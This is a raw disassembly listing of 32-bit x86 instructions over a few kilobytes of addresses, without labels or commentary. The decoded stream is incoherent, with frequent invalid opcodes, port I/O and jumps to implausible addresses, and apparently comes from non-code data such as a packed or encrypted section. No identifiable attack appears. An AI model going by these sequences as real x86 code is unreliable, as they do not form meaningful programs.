  4151f5:	add    DWORD PTR [edx-0x43],ebp
  4151f8:	inc    edx
  4151f9:	pop    ebp
  4151fa:	outs   dx,BYTE PTR ds:[esi]
  4151fb:	es inc eax
  4151fd:	jg     0x4151cb
  4151ff:	push   cs
  415200:	or     al,BYTE PTR [eax]
  415202:	nop
  415203:	leave  
  415204:	add    al,BYTE PTR [eax]
  415206:	popa   
  415207:	cmp    BYTE PTR [ebp+0x31],bl
  41520a:	retf   
  41520b:	pushf  
  41520c:	or     eax,0xb8
  415211:	add    BYTE PTR [eax],al
  415213:	adc    al,BYTE PTR [edi+0xb]
  415216:	inc    DWORD PTR [esi-0x80]
  415219:	mov    ecx,0x22bc6773
  41521e:	adc    ah,0x9
  415221:	pop    esp
  415222:	std    
  415223:	popf   
  415224:	fstp   DWORD PTR [eax]
  415226:	inc    eax
  415227:	nop
  415228:	sub    DWORD PTR [ebx-0x7e],esp
  41522b:	int3   
  41522c:	or     DWORD PTR [ebx-0x1],edx
  41522f:	in     al,0xf8
  415231:	idiv   dh
  415233:	sbb    BYTE PTR [edi],cl
  415235:	pop    ds
  415236:	jno    0x41520c
  415238:	or     DWORD PTR [edx+0x1b],esi
  41523b:	adc    al,0x88
  41523d:	das    
  41523e:	add    dl,dh
  415240:	or     DWORD PTR [ecx+0x30b29044],0xf30aa3ab
  41524a:	inc    ebx
  41524b:	nop
  41524c:	(bad)  
  41524d:	xchg   esp,eax
  41524e:	das    
  41524f:	arpl   WORD PTR [edi+ecx*1+0x30],sp
  415253:	js     0x4152b9
  415255:	icebp  
  415256:	pop    es
  415257:	into   
  415258:	jle    0x41522f
  41525a:	cmp    DWORD PTR [ebp-0x6ffc52d3],eax
  415260:	mov    dl,0x20
  415262:	rcr    DWORD PTR [esi-0x4be21a8e],cl
  415268:	pop    es
  415269:	add    ebp,DWORD PTR [ebx-0x70]
  41526c:	fwait
  41526d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41526e:	add    edi,DWORD PTR [edx-0x33]
  415271:	dec    esp
  415272:	or     al,0x25
  415274:	add    ecx,edi
  415276:	inc    ebx
  415277:	add    BYTE PTR [eax],al
  415279:	add    BYTE PTR [eax],al
  41527b:	add    BYTE PTR [eax-0x7f60e278],dl
  415281:	xor    edx,ebp
  415283:	adc    dl,BYTE PTR [eax-0x4e]
  415286:	retf   
  415287:	pop    es
  415288:	mov    ecx,0xa6a368ab
  41528d:	jb     0x415274
  41528f:	sbb    eax,0x3691519a
  415294:	push   esp
  415295:	mov    dl,0x9f
  415297:	push   eax
  415298:	adc    esi,esp
  41529a:	pop    es
  41529b:	adc    al,0x7d
  41529e:	rcr    DWORD PTR [ebx],0x8
  4152a1:	sub    esp,DWORD PTR [ebp+0x659d8d03]
  4152a7:	adc    eax,0xc462b2d0
  4152ac:	add    al,0x9b
  4152ae:	pop    ebp
  4152af:	or     BYTE PTR fs:[edx-0x1b],dh
  4152b3:	push   ebx
  4152b4:	ins    DWORD PTR es:[edi],dx
  4152b5:	popf   
  4152b6:	test   DWORD PTR [esi],edx
  4152b8:	shl    BYTE PTR [edx+0x6e8dc462],1
  4152be:	stos   BYTE PTR es:[edi],al
  4152bf:	fdivr  QWORD PTR gs:[edi+0xe]
  4152c3:	sub    eax,0x88090994
  4152c8:	add    BYTE PTR [ecx-0xfd316b6],0x50
  4152cf:	adc    eax,0x1dce2fd2
  4152d4:	(bad)  
  4152d5:	daa    
  4152d6:	inc    edx
  4152d7:	lds    ebx,FWORD PTR [edi]
  4152d9:	fs pop ebx
  4152db:	adc    DWORD PTR [edx+eiz*4+0xe90e],edx
  4152e2:	add    BYTE PTR [eax],al
  4152e4:	add    al,al
  4152e6:	cmc    
  4152e7:	(bad)  [esp+edx*8+0x7e]
  4152eb:	inc    esi
  4152ec:	outs   dx,BYTE PTR ds:[esi]
  4152ed:	ror    dh,0x2
  4152f0:	jb     0x4152aa
  4152f2:	into   
  4152f3:	adc    ah,BYTE PTR [ebx-0x16110c70]
  4152f9:	or     ecx,DWORD PTR [edi+0x2993eb0e]
  4152ff:	inc    BYTE PTR [esi-0x60]
  415302:	into   
  415303:	add    bh,BYTE PTR [esi]
  415305:	xchg   DWORD PTR [edx],edi
  415307:	sbb    BYTE PTR [ecx-0x4b07d06d],ch
  41530d:	mov    cl,0xf5
  41530f:	jns    0x4152de
  415311:	mov    esi,ebp
  415313:	sbb    BYTE PTR [ecx-0x63],al
  415316:	jb     0x415326
  415318:	pop    ecx
  415319:	xchg   ebx,eax
  41531a:	or     DWORD PTR [esi+ecx*1],edx
  41531d:	pusha  
  41531e:	into   
  41531f:	push   ss
  415320:	push   0xe93eb1da
  415325:	xchg   ebx,eax
  415326:	popa   
  415327:	pop    ebx
  415328:	lahf   
  415329:	in     al,0xef
  41532b:	sbb    BYTE PTR [ebp+0x6c0e729c],al
  415331:	push   ebx
  415332:	(bad)  
  415334:	sbb    ecx,DWORD PTR [eax+edx*4+0x50]
  415338:	xor    bl,bl
  41533a:	hlt    
  41533b:	add    eax,0x5b81c2e9
  415340:	add    BYTE PTR [esp+eax*4+0x59],bh
  415344:	mov    edx,DWORD PTR [ebp+0x6a12d2]
  41534a:	add    BYTE PTR [eax],al
  41534c:	add    BYTE PTR [eax],al
  41534e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41534f:	outs   dx,DWORD PTR ds:[esi]
  415350:	aam    0x8b
  415352:	or     BYTE PTR [esi-0x75],bh
  415355:	call   FWORD PTR [ebp+0x2e3968ee]
  41535b:	mov    eax,ds:0xb7fe830d
  415360:	mov    esi,esi
  415362:	inc    esi
  415363:	jb     0x415353
  415365:	add    BYTE PTR [ecx],ch
  415367:	mov    dh,0x85
  415369:	retf   
  41536a:	add    DWORD PTR [eax-0xf],ebp
  41536d:	add    ecx,edi
  41536f:	outs   dx,BYTE PTR ds:[esi]
  415370:	out    0x81,al
  415372:	je     0x415365
  415374:	out    dx,eax
  415375:	(bad)  
  415376:	jmp    0xea0ce165
  41537b:	mov    ch,0xe
  41537d:	mov    esi,DWORD PTR [esi-0x7006cb3]
  415383:	mov    ch,0x85
  415385:	enter  0xa960,0x2a
  415389:	adc    BYTE PTR [eax+0x1c],ch
  41538c:	or     al,BYTE PTR [ecx]
  41538e:	mov    ecx,0x4b8301b5
  415393:	mov    ch,0xe
  415395:	add    BYTE PTR [eax+ecx*2],ch
  415398:	jnp    0x4153a2
  41539a:	sub    al,0x2c
  41539c:	add    DWORD PTR [edi+ebx*2+0x2c000eb5],eax
  4153a3:	sub    al,0x7b
  4153a5:	sub    dl,dl
  4153a7:	es jp  0x4153bd
  4153aa:	and    al,0xf1
  4153ac:	arpl   WORD PTR [edx],ax
  4153ae:	jns    0x415365
  4153b0:	push   cs
  4153b1:	push   eax
  4153b2:	add    BYTE PTR [eax],al
  4153b4:	add    BYTE PTR [eax],al
  4153b6:	add    BYTE PTR [edx],ch
  4153b8:	xor    ecx,0x15
  4153bb:	aad    0xc0
  4153bd:	dec    esi
  4153be:	add    dl,ch
  4153c0:	repnz add DWORD PTR [esi-0x70],edx
  4153c4:	or     BYTE PTR ds:0xa9b83d8,bl
  4153ca:	mov    DWORD PTR [esi+0x3],ecx
  4153cd:	inc    eax
  4153ce:	std    
  4153cf:	xchg   ecx,eax
  4153d0:	(bad)  [ebp+0x4]
  4153d3:	(bad)  
  4153d4:	hlt    
  4153d5:	and    eax,DWORD PTR [ebx-0x74bf58cb]
  4153db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153dc:	(bad)  
  4153dd:	or     al,BYTE PTR [eax]
  4153df:	nop
  4153e0:	fist   DWORD PTR [esp+ebx*2]
  4153e3:	enter  0xe1c1,0x43
  4153e7:	mov    al,BYTE PTR [ecx+0x71]
  4153ea:	push   esp
  4153eb:	je     0x4153fc
  4153ed:	clc    
  4153ee:	xchg   edx,eax
  4153ef:	int3   
  4153f0:	test   DWORD PTR [esi],0x2f22d031
  4153f6:	and    al,0xa4
  4153f8:	adc    BYTE PTR [esi+0xb9a93c0],bl
  4153fe:	ret    
  4153ff:	mov    ch,0xd7
  415401:	or     DWORD PTR [eax],eax
  415403:	nop
  415404:	or     al,0x33
  415406:	cmp    ebx,esp
  415408:	push   es
  415409:	call   DWORD PTR [ecx+0x43]
  41540c:	push   ecx
  41540d:	test   al,0x13
  41540f:	xor    al,0x9
  415411:	dec    ebx
  415412:	add    BYTE PTR [ebx],bl
  415414:	pop    ss
  415415:	iret   
  415416:	sbb    ebx,DWORD PTR [ebx]
  415418:	inc    edi
  415419:	iret   
  41541a:	pop    ds
  41541b:	add    BYTE PTR [eax],al
  41541d:	add    BYTE PTR [eax],al
  41541f:	add    BYTE PTR [ebx],dl
  415421:	lahf   
  415422:	test   BYTE PTR [eax],0xc2
  415425:	pop    edx
  415426:	es and al,0x8c
  415429:	fistp  DWORD PTR [esi]
  41542b:	pop    es
  41542c:	cmp    bl,BYTE PTR [edi]
  41542e:	inc    ebx
  41542f:	or     cx,sp
  415432:	mov    eax,esi
  415434:	xchg   edx,eax
  415435:	pop    esi
  415436:	push   cs
  415437:	dec    ebx
  415438:	xchg   edx,eax
  415439:	(bad)  [edx]
  41543b:	add    al,ah
  41543d:	dec    eax
  41543e:	inc    ecx
  41543f:	std    
  415440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415441:	mov    dl,0x49
  415443:	push   cs
  415444:	shl    BYTE PTR [edx-0x7763409c],1
  41544a:	fcom   DWORD PTR [eax]
  41544c:	dec    eax
  41544d:	les    esp,FWORD PTR ds:0xdbf90904
  415453:	add    DWORD PTR [ecx-0x14b9f00e],esp
  415459:	mov    ebx,DWORD PTR [esi]
  41545b:	dec    ebp
  41545c:	push   edx
  41545d:	mov    bh,0xe5
  41545f:	jae    0x4154a0
  415461:	repnz hlt 
  415463:	add    edi,DWORD PTR [esi]
  415465:	ja     0x415430
  415467:	jmp    FWORD PTR [esi]
  415469:	xchg   BYTE PTR [esp+esi*4+0x4d],ch
  41546d:	mov    ecx,0xb2d07b71
  415472:	icebp  
  415473:	add    BYTE PTR [eax],ch
  415475:	fist   WORD PTR [eax*1+0x459f3b90]
  41547c:	shl    BYTE PTR [esi-0x7d40411b],cl
  415482:	out    0x3,al
  415484:	add    BYTE PTR [eax],al
  415486:	add    BYTE PTR [eax],al
  415488:	add    BYTE PTR [eax-0x2efb6a4e],dl
  41548e:	out    dx,eax
  41548f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415490:	sbb    esp,DWORD PTR [eax]
  415492:	mov    dl,0x24
  415494:	dec    ebp
  415495:	or     edx,esp
  415497:	arpl   WORD PTR ds:0x9bab340,sp
  41549d:	cmp    dh,BYTE PTR [edx+ebp*2+0x7d5a5c35]
  4154a4:	jnp    0x4154f6
  4154a6:	mov    dl,0x28
  4154a8:	xor    al,0x8c
  4154aa:	ficom  DWORD PTR [eax+0x61efaf0a]
  4154b0:	ret    
  4154b1:	and    esi,DWORD PTR [esi-0xcc13c2d]
  4154b7:	jnp    0x41546e
  4154b9:	int    0x78
  4154bb:	xchg   ebp,eax
  4154bc:	dec    DWORD PTR [edi+0x2be90def]
  4154c2:	test   eax,0xd2293e8
  4154c8:	inc    edi
  4154c9:	push   ecx
  4154ca:	sbb    DWORD PTR [eax+0x72],0x2f838523
  4154d1:	mov    esp,0x84057239
  4154d6:	jp     0x415552
  4154d8:	or     al,0x7a
  4154da:	mov    ah,0x53
  4154dc:	adc    dl,BYTE PTR [ecx+0x63]
  4154df:	and    DWORD PTR [edx],ebx
  4154e1:	mov    edi,0xac415a80
  4154e6:	cmp    cl,BYTE PTR [esi-0x17]
  4154e9:	in     al,dx
  4154ea:	pop    esi
  4154eb:	or     dl,BYTE PTR [ecx+0x0]
  4154f1:	add    BYTE PTR [ecx],bh
  4154f3:	retf   0xe90d
  4154f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154f7:	bnd js 0x4154df
  4154fa:	and    DWORD PTR [edi],ebp
  4154fc:	jecxz  0x4154cc
  4154fe:	call   0x7038:0x5925e90
  415505:	or     eax,0xeb5e7845
  41550a:	xchg   ebx,eax
  41550b:	mov    dl,0xe
  41550d:	push   ecx
  41550e:	adc    dh,bl
  415510:	or     al,0xe9
  415512:	xor    al,0x66
  415514:	sub    bh,ch
  415516:	pop    esi
  415517:	sbb    BYTE PTR [edx-0x4a],0xfb
  41551b:	in     al,dx
  41551c:	adc    ebp,eax
  41551e:	xchg   ebx,eax
  41551f:	in     eax,0xd5
  415521:	loop   0x4154f6
  415523:	in     al,0xd5
  415525:	xchg   esi,eax
  415526:	dec    ebp
  415527:	mov    esp,ecx
  415529:	loope  0x4154be
  41552b:	mov    BYTE PTR [ebx+0x5e783918],al
  415531:	mov    cl,0x6b
  415533:	arpl   WORD PTR ds:0x403b9183,bp
  415539:	mov    ch,0x7b
  41553b:	xchg   BYTE PTR cs:[eax],al
  41553e:	jmp    0x75b346f5
  415543:	dec    edx
  415544:	in     al,0x1a
  415546:	js     0x4154fa
  415548:	mov    eax,eax
  41554a:	add    al,0xee
  41554c:	cmp    al,0xc0
  41554e:	bound  esi,QWORD PTR [ebp-0x4c56b937]
  415554:	push   cs
  415555:	add    BYTE PTR [eax],al
  415557:	add    BYTE PTR [eax],al
  415559:	add    BYTE PTR [eax],al
  41555b:	jns    0x415574
  41555d:	jp     0x415583
  41555f:	cmp    eax,0x4e544065
  415564:	sahf   
  415565:	sub    cl,BYTE PTR [ecx+eiz*2]
  415568:	pop    edx
  415569:	adc    al,0x1
  41556b:	cmp    DWORD PTR [edi],ebx
  41556d:	(bad)  
  41556e:	sbb    ebp,ecx
  415570:	push   ds
  415571:	(bad)  
  415572:	pop    esi
  415573:	jmp    0x41555e
  415575:	out    dx,al
  415576:	push   ebp
  415577:	push   cs
  415578:	sahf   
  415579:	sub    cl,BYTE PTR [eax]
  41557b:	mov    dl,0x20
  41557d:	out    0x6e,al
  41557f:	cmc    
  415580:	mov    al,0xe
  415582:	push   0xeb429
  415587:	jl     0x415530
  415589:	pop    edx
  41558a:	(bad)  
  41558b:	imul   DWORD PTR ds:0x49e94086
  415591:	inc    ebx
  415592:	sbb    ch,al
  415594:	mov    cl,0x8d
  415596:	shl    WORD PTR [ecx-0x12d6b937],0xee
  41559e:	(bad)  
  41559f:	jmp    0xaba01e0e
  4155a4:	in     eax,dx
  4155a5:	out    dx,al
  4155a6:	push   ebp
  4155a7:	inc    edx
  4155a8:	and    dh,ah
  4155aa:	adc    al,0xb9
  4155ac:	mov    cl,0xe
  4155ae:	div    ch
  4155b0:	or     eax,0xef150107
  4155b5:	test   esi,ecx
  4155b7:	sbb    DWORD PTR [ebx+0x41],0x75db9001
  4155be:	mov    BYTE PTR [eax],0x0
  4155c1:	add    BYTE PTR [eax],al
  4155c3:	add    BYTE PTR [esi],bh
  4155c5:	cdq    
  4155c6:	out    dx,eax
  4155c7:	(bad)  
  4155c8:	cmp    eax,0xde89bc60
  4155cd:	inc    edi
  4155ce:	mov    dl,0x6
  4155d0:	dec    esp
  4155d1:	push   ebx
  4155d2:	dec    ebx
  4155d3:	add    BYTE PTR [eax+0x78],ch
  4155d6:	cmp    bh,bh
  4155d8:	ja     0x4155f6
  4155da:	add    al,0x9c
  4155dc:	xor    al,0x9b
  4155de:	or     bl,BYTE PTR [esi+0x53]
  4155e1:	scas   al,BYTE PTR es:[edi]
  4155e2:	jg     0x4155d0
  4155e4:	adc    ebp,DWORD PTR [edi]
  4155e6:	not    BYTE PTR [ebp-0x41]
  4155e9:	pusha  
  4155ea:	sub    eax,0x872a1b08
  4155ef:	jge    0x415589
  4155f1:	fist   DWORD PTR ds:0xfa9d1349
  4155f7:	inc    ebx
  4155f9:	add    bl,BYTE PTR [esi+0x4514c44d]
  4155ff:	in     al,dx
  415600:	xchg   ecx,eax
  415601:	fisttp DWORD PTR [edx]
  415603:	add    BYTE PTR [ebx],cl
  415605:	fiadd  DWORD PTR [ecx+0x49602043]
  41560b:	add    al,0x19
  41560d:	xchg   esi,eax
  41560e:	xchg   esi,eax
  41560f:	xchg   DWORD PTR [ebp+0x63],edx
  415612:	and    BYTE PTR [eax],al
  415614:	jmp    esp
  415616:	cli    
  415617:	mov    al,BYTE PTR [ebp-0x79]
  41561a:	mov    ds:0xad99355,al
  41561f:	test   al,dl
  415621:	or     eax,0xe75e81bc
  415626:	or     dh,BYTE PTR [eax+eax*1+0x0]
  41562a:	add    BYTE PTR [eax],al
  41562c:	add    BYTE PTR [esi+0x74],bh
  41562f:	adc    al,0x18
  415631:	sbb    eax,0x3efd371c
  415636:	bt     ecx,esi
  415639:	cdq    
  41563a:	fimul  DWORD PTR [edx]
  41563c:	adc    eax,0xffffffb1
  41563f:	xchg   edx,eax
  415640:	pop    es
  415641:	(bad)  
  415643:	sbb    eax,DWORD PTR [esi]
  415645:	loopne 0x4155f9
  415647:	mov    eax,0xe8efd741
  41564c:	add    eax,DWORD PTR [ebx+0x39]
  41564f:	sbb    DWORD PTR [edi-0x716a148c],eax
  415655:	sar    DWORD PTR [edx+0x37e53994],cl
  41565b:	(bad)  
  41565c:	fmulp  st(4),st
  41565e:	mov    dh,0x7a
  415660:	cmp    dh,BYTE PTR [eax-0x6f8c67c3]
  415666:	mov    dl,0xe5
  415668:	adc    dl,ah
  41566a:	loopne 0x4156cf
  41566c:	and    eax,eax
  41566e:	mov    dl,0x32
  415670:	or     eax,DWORD PTR [eax]
  415672:	mov    dl,0xde
  415674:	push   cs
  415675:	inc    edi
  415676:	in     al,dx
  415677:	in     al,0x8e
  415679:	fcmovnb st,st(6)
  41567b:	ins    BYTE PTR es:[edi],dx
  41567c:	cmp    BYTE PTR [eax-0x3b72f3c9],ah
  415682:	xchg   esi,eax
  415683:	loope  0x4156bb
  415685:	ret    0xa737
  415688:	stos   DWORD PTR es:[edi],eax
  415689:	shl    esi,cl
  41568b:	in     eax,0x3
  41568d:	test   DWORD PTR [edi+esi*1],esp
  415690:	jmp    0x415692
  415692:	add    BYTE PTR [eax],al
  415694:	add    BYTE PTR [eax],al
  415696:	adc    dl,dl
  415698:	out    dx,eax
  415699:	pop    ss
  41569a:	(bad)  
  41569b:	das    
  41569c:	jle    0x41569c
  41569e:	mov    WORD PTR ds:0xb2900372,?
  4156a4:	jl     0x4156dd
  4156a6:	mov    ah,0xbe
  4156a8:	in     al,0xb3
  4156aa:	mov    ecx,0xb4376e0a
  4156af:	mov    esi,0x3685cc6a
  4156b4:	fwait
  4156b5:	add    edx,DWORD PTR [eax+0x60497cb2]
  4156bb:	jp     0x4156cb
  4156bd:	mov    eax,ds:0xa14668a7
  4156c2:	mov    ds:0x93e99e2f,al
  4156c7:	mov    dl,0x35
  4156c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156ca:	imul   edi,DWORD PTR [ebp-0x4d6cd776],0xe
  4156d1:	fs (bad) 
  4156d3:	ins    BYTE PTR es:[edi],dx
  4156d4:	add    BYTE PTR [edx-0x2687123b],bl
  4156da:	xor    bh,BYTE PTR [edi-0x4d2c20ae]
  4156e0:	mov    esp,DWORD PTR ds:0xfd493987
  4156e6:	test   eax,0xcf721633
  4156eb:	ret    0xa683
  4156ee:	or     esi,DWORD PTR [esi+0x2a]
  4156f1:	stc    
  4156f2:	sub    esp,esp
  4156f4:	out    dx,eax
  4156f5:	(bad)  
  4156f6:	icebp  
  4156f7:	xor    eax,0xeece
  4156fc:	add    BYTE PTR [eax],al
  4156fe:	add    BYTE PTR [edi],cl
  415700:	inc    ecx
  415701:	push   cs
  415702:	jmp    0x414eaf9a
  415707:	dec    esp
  415708:	cmp    cl,BYTE PTR [esi-0x17]
  41570b:	lock arpl WORD PTR [esi+0x6c],dx
  41570f:	ret    0xe686
  415712:	rcr    DWORD PTR [edx],1
  415714:	in     al,dx
  415715:	out    dx,al
  415716:	fs dec esp
  415718:	data16 jno 0x4156a1
  41571b:	test   eax,0xa02c83be
  415720:	in     eax,dx
  415721:	jbe    0x415704
  415723:	xor    BYTE PTR [esi+edx*2+0x6e],ah
  415727:	call   0xeeeb:0x15fee686
  41572e:	gs int3 
  415730:	imul   ebp,DWORD PTR gs:[edx-0x56],0x4a260e8a
  415738:	or     BYTE PTR [ecx],0x0
  41573b:	mov    ecx,0xe7eb0eae
  415740:	cmp    eax,0x73926448
  415745:	push   ds
  415746:	je     0x415727
  415748:	adc    DWORD PTR [ecx+0xc],edi
  41574b:	and    bh,BYTE PTR [ebx+0x2]
  41574e:	(bad)  
  41574f:	(bad)  
  415750:	mov    dh,0x5e
  415752:	(bad)  
  415753:	cld    
  415754:	fsubrp st(6),st
  415756:	in     al,dx
  415757:	sub    BYTE PTR [edi-0x35467bf2],ch
  41575d:	xor    al,0x8b
  41575f:	mov    bh,0x16
  415761:	push   0xffffffc3
  415763:	add    BYTE PTR [eax],al
  415765:	add    BYTE PTR [eax],al
  415767:	add    BYTE PTR [eax-0x4a],ch
  41576a:	test   DWORD PTR [ebp+ecx*2-0x46],edx
  41576e:	mov    ebx,ebx
  415770:	inc    bx
  415772:	adc    edi,edi
  415774:	inc    esi
  415775:	adc    ecx,DWORD PTR [ebp+0x70b5997e]
  41577b:	or     al,0xea
  41577d:	xchg   ebx,eax
  41577e:	pop    esi
  41577f:	add    eax,0x4585bcd4
  415784:	pop    ebp
  415785:	das    
  415786:	cs add cl,al
  415789:	push   ebp
  41578a:	adc    DWORD PTR [eax],eax
  41578c:	sub    DWORD PTR [edi],eax
  41578e:	dec    ecx
  41578f:	pop    eax
  415790:	xchg   ebx,eax
  415791:	out    dx,al
  415792:	out    dx,eax
  415793:	shl    BYTE PTR [esi+0x74],0x55
  415797:	mov    ecx,DWORD PTR [ecx+ebp*4]
  41579a:	int3   
  41579b:	adc    BYTE PTR [ecx],ch
  41579d:	add    BYTE PTR [edi-0x7a5f7515],ch
  4157a3:	in     al,dx
  4157a4:	stos   BYTE PTR es:[edi],al
  4157a5:	lods   al,BYTE PTR ds:[esi]
  4157a6:	test   ecx,esi
  4157a8:	sahf   
  4157a9:	call   ebp
  4157ab:	push   ebx
  4157ac:	push   esp
  4157ad:	sub    DWORD PTR [esi],0xffffffc7
  4157b0:	call   DWORD PTR [ecx]
  4157b2:	xchg   BYTE PTR [eax-0x7],al
  4157b5:	sbb    eax,0x8090fdd7
  4157ba:	scas   al,BYTE PTR es:[edi]
  4157bb:	push   0xffffff91
  4157bd:	xchg   BYTE PTR [ebp+0xadb9090],bl
  4157c3:	call   0xfdeffe9c
  4157c8:	(bad)  
  4157c9:	push   ss
  4157ca:	repz inc BYTE PTR [eax]
  4157cd:	add    BYTE PTR [eax],al
  4157cf:	add    BYTE PTR [eax],al
  4157d1:	or     cl,BYTE PTR [edi]
  4157d3:	inc    DWORD PTR [esi+0x5e83d756]
  4157d9:	and    BYTE PTR [edx+0x4d],0x14
  4157dd:	or     DWORD PTR [edx],esp
  4157df:	repz jae 0x41585c
  4157e2:	add    dh,BYTE PTR [eax]
  4157e4:	or     BYTE PTR [esp+edx*8],al
  4157e7:	and    BYTE PTR [ebx],al
  4157e9:	xchg   DWORD PTR [esi+0x3],ebx
  4157ec:	mov    esp,esi
  4157ee:	dec    ebx
  4157ef:	or     BYTE PTR [esi-0x40],0xb3
  4157f3:	inc    edx
  4157f4:	in     al,dx
  4157f5:	nop
  4157f6:	fisttp DWORD PTR [ebx+0xb7f8df8]
  4157fc:	xchg   DWORD PTR [esi+0x7843988b],edi
  415802:	fst    QWORD PTR ds:0xaa511906
  415808:	add    BYTE PTR [eax+0x56892fdb],dl
  41580e:	shl    DWORD PTR [ebx],0x5b
  415811:	push   edx
  415812:	dec    DWORD PTR [edx]
  415814:	push   esi
  415815:	sbb    ecx,DWORD PTR [edx-0x5e]
  415818:	adc    al,0x90
  41581a:	fisttp DWORD PTR [edx]
  41581c:	not    ah
  41581e:	test   DWORD PTR [edx],0x83d0a3ff
  415824:	into   
  415825:	clc    
  415826:	mov    edi,0x6407ff5d
  41582b:	enter  0xd25e,0xd6
  41582f:	or     dl,BYTE PTR [esi+0xb]
  415832:	push   0xffffff83
  415834:	dec    esi
  415835:	add    BYTE PTR [eax],al
  415837:	add    BYTE PTR [eax],al
  415839:	add    BYTE PTR [edx+esi*4+0x39ec0620],al
  415840:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415841:	add    ebp,eax
  415843:	mov    DWORD PTR [edx+0x4f379004],ebp
  415849:	je     0x4157db
  41584b:	mov    dl,0xe5
  41584d:	stos   DWORD PTR es:[edi],eax
  41584e:	pop    ds
  41584f:	out    0x2f,eax
  415851:	lahf   
  415852:	or     edi,DWORD PTR [eax+0x5]
  415855:	lods   al,BYTE PTR ds:[esi]
  415856:	pop    es
  415857:	out    0x1f,eax
  415859:	lahf   
  41585a:	aad    0xaf
  41585c:	sbb    DWORD PTR [eax+edx*2+0x4fc2afb2],ecx
  415863:	test   DWORD PTR [edx-0x6ec34076],esi
  415869:	out    0x9f,eax
  41586b:	sbb    BYTE PTR ds:0xe5b288fa,0x8a
  415872:	int3   
  415873:	mov    ds,ebp
  415875:	mov    ch,BYTE PTR [eax-0x25]
  415878:	iret   
  415879:	call   0xb6ac:0x477de86f
  415880:	push   0xffffffb0
  415882:	in     al,0x7e
  415884:	push   0x38
  415886:	xchg   ebx,eax
  415887:	mov    bl,0xb5
  415889:	nop
  41588a:	fnstcw WORD PTR [esi-0x4e2b7f23]
  415890:	in     eax,0x87
  415892:	push   eax
  415893:	pop    edi
  415894:	and    al,0x8b
  415896:	add    DWORD PTR [esi+0x7f9043d7],0x7c
  41589d:	sbb    al,BYTE PTR [eax]
  41589f:	add    BYTE PTR [eax],al
  4158a1:	add    BYTE PTR [eax],al
  4158a3:	jl     0x415922
  4158a5:	nop
  4158a6:	pop    ss
  4158a7:	je     0x41586f
  4158a9:	xor    BYTE PTR [edi-0x757d4bc2],bl
  4158af:	jl     0x41583f
  4158b1:	jmp    0xc9a05dee
  4158b6:	out    dx,eax
  4158b7:	jne    0x4158a8
  4158b9:	or     eax,0x8bc7d9ee
  4158be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158bf:	xchg   ecx,eax
  4158c0:	jge    0x4158b1
  4158c2:	aas    
  4158c3:	xchg   edx,eax
  4158c4:	jmp    0x415850
  4158c6:	and    eax,0xeec74ddb
  4158cb:	cmp    BYTE PTR [ebx+ecx*4+0xd229126],0x2f
  4158d3:	mov    ?,WORD PTR [edx+0x30c7c223]
  4158d9:	jae    0x4158ac
  4158db:	jbe    0x4158b6
  4158dd:	push   ss
  4158de:	bound  ebx,QWORD PTR [edx-0x42]
  4158e1:	out    0x66,al
  4158e3:	push   edi
  4158e4:	out    0xee,eax
  4158e6:	push   0x72
  4158e8:	mov    esi,0xca726a0e
  4158ed:	push   cs
  4158ee:	ficom  DWORD PTR [ebx+0x33]
  4158f1:	loope  0x4158e9
  4158f3:	push   edx
  4158f5:	dec    edi
  4158f6:	pushf  
  4158f7:	mov    edx,0x93e1cc7f
  4158fc:	add    BYTE PTR [ebx+0x64b2b8f8],0xe9
  415903:	dec    esp
  415904:	mov    al,0xfa
  415906:	jno    0x415908
  415908:	add    BYTE PTR [eax],al
  41590a:	add    BYTE PTR [eax],al
  41590c:	aam    0xb2
  41590e:	out    dx,eax
  41590f:	cld    
  415910:	out    dx,eax
  415911:	ror    BYTE PTR [esi-0x17],0x1a
  415915:	jo     0x415921
  415917:	jb     0x415967
  415919:	mov    bl,cl
  41591b:	pop    ss
  41591c:	or     edi,edx
  41591e:	in     eax,0xdd
  415920:	xchg   ebx,eax
  415921:	mov    dl,0xe
  415923:	mov    bh,0xd8
  415925:	mov    es,WORD PTR [esi]
  415927:	call   0xafc506ab
  41592c:	in     al,dx
  41592d:	pop    esi
  41592e:	inc    edx
  41592f:	call   0x300992c7
  415934:	shr    BYTE PTR [ebp+0x39a7000e],cl
  41593a:	fild   WORD PTR [ebx-0x38f15101]
  415940:	out    0x3e,eax
  415942:	xchg   BYTE PTR [eax-0x7],al
  415945:	mov    esi,0xaeef8308
  41594a:	out    dx,eax
  41594b:	je     0x415930
  41594d:	inc    ebp
  41594e:	sbb    esi,DWORD PTR [eax-0x7cf18d29]
  415954:	das    
  415955:	scas   eax,DWORD PTR es:[edi]
  415956:	icebp  
  415957:	pop    esi
  415958:	jp     0x415993
  41595a:	inc    edi
  41595b:	add    al,0xba
  41595d:	repnz dec ebp
  41595f:	test   DWORD PTR [eax-0x36],esi
  415962:	add    BYTE PTR [ebx],bh
  415964:	jno    0x415930
  415966:	add    al,0x81
  415968:	jo     0x41591a
  41596a:	out    dx,eax
  41596b:	add    BYTE PTR [ecx],ch
  41596d:	retf   0x330c
  415970:	add    BYTE PTR [eax],al
  415972:	add    BYTE PTR [eax],al
  415974:	add    BYTE PTR [ecx-0xf],ch
  415977:	pop    edx
  415978:	mov    ecx,DWORD PTR [ebp-0x729a725f]
  41597e:	scas   al,BYTE PTR es:[edi]
  41597f:	add    DWORD PTR [ebp+0x7d],0xffffffa2
  415983:	pop    esp
  415984:	push   0xe6e68
  415989:	adc    esi,DWORD PTR [edx+0x7e64ff3f]
  41598f:	sbb    BYTE PTR [eax+0x69],al
  415992:	sub    eax,0x3b6678ce
  415997:	dec    ebx
  415998:	cld    
  415999:	mov    ah,0xf1
  41599b:	jp     0x41599f
  41599d:	dec    edx
  41599e:	repnz mov bl,0x9a
  4159a2:	pushf  
  4159a3:	add    DWORD PTR fs:[edx+0x49eb5c28],esi
  4159aa:	cmp    ebx,ebp
  4159ac:	mov    ebx,edi
  4159ae:	sbb    DWORD PTR [esp+eiz*4],ebx
  4159b1:	sub    DWORD PTR [edx-0x386f3f76],esi
